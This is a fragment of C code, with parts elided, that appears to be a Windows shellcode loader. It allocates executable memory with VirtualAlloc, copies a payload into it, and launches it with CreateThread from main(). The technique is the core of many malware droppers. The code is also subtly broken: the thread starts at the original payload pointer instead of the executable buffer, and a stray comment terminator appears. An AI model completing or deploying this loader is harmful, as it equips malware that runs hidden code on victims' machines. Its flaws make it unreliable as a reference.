...
void injection(unsigned char* payload, SIZE_T size) {
    ...
    PointerToCode = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (PointerToCode == NULL) goto ExitAndCleanup;

    memcpy(PointerToCode, payload, size);
    ...
    HandleThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, 0, 0, NULL);
    */
...
void main(void) {
    ...
    printf("Payload size is %d bytees\n", (int)SizePayload);

    injection(MyPayload, SizePayload);
